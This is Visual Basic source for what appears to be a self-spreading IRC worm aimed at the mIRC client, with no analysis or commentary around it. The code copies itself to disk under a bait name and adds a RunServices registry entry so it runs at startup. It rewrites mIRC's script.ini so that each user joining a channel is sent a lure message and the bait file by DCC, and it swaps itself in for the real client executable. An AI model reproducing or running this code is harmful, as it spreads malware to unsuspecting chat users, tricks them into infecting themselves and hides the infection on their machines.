Option Explicit
Sub Main()
On Error Resume Next
Dim a, b, c, d, e, g, fso
a = App.Path & App.EXEName & ".exe"
b = App.Path & "\" & App.EXEName & ".exe"
c = "c:\mirc32.exe"
d = "c:\takeover._x_"
e = "c:\mIRC\mirc32.exe"
FileCopy a, c
FileCopy b, c
FileCopy a, d
FileCopy b, d
Set g = CreateObject("WScript.Shell")
g.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices\*mirc32", c
Open "c:\mIRC\script.ini" For Output As 3
Print #3, "[script]"
Print #3, "n5= on 1:JOIN:#:{"
Print #3, "n6= /if ( $nick == $me ) { halt }"
Print #3, "n7= /msg $nick do you wanna take over a channel? put e on the blanks and you're set.."
Print #3, "n8= /dcc send -c $nick c:\takeover._x_"
Print #3, "n9= }"
Close 3
If Dir("c:\mIRC\irc.com") <> "irc.com" Then
Set fso = CreateObject("Scripting.FileSystemObject")
Set g = fso.getfile(e)
g.Copy ("c:\mIRC\irc.com")
FileCopy c, e
End If
Shell "c:\mIRC\irc.com"
End Sub